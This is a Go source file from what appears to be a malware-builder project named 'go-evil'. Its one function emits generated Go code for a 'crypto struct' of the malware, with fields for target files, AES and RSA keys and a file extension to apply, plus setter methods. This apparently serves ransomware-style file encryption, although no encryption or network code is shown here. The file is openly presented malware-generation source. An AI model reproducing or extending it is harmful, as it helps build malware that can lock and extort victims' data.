package structs

import "github.com/TeamPhoneix/go-evil/utility/structure"

// Generates the crypto struct (read rib) of the malware
func Generate_crypt(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type crypt_t struct {",
		"method string",
		"target []string",
		"aes_key string",
		"aes_key_length int",
		"rsa_public rsa.PublicKey",
		"rsa_private *rsa.PrivateKey",
		"rsa_key_length int",
		"target_extension bool",
		"extension string",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) set_crypto(value string) {",
		"obj.method = value",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) set_aes_key(value string) {",
		"obj.aes_key = value",
		"obj.aes_key_length = len(value)",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) set_rsa_key(private_key *rsa.PrivateKey, key_length int) {",
		"obj.rsa_private = private_key",
		"obj.rsa_public = private_key.PublicKey",
		"obj.rsa_key_length = key_length",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) add_target(value string) {",
		"obj.target = append(obj.target, value)",
		"}"})

	data_object.Add_go_import("crypto/rsa")

	return structure.Send(data_object)
}
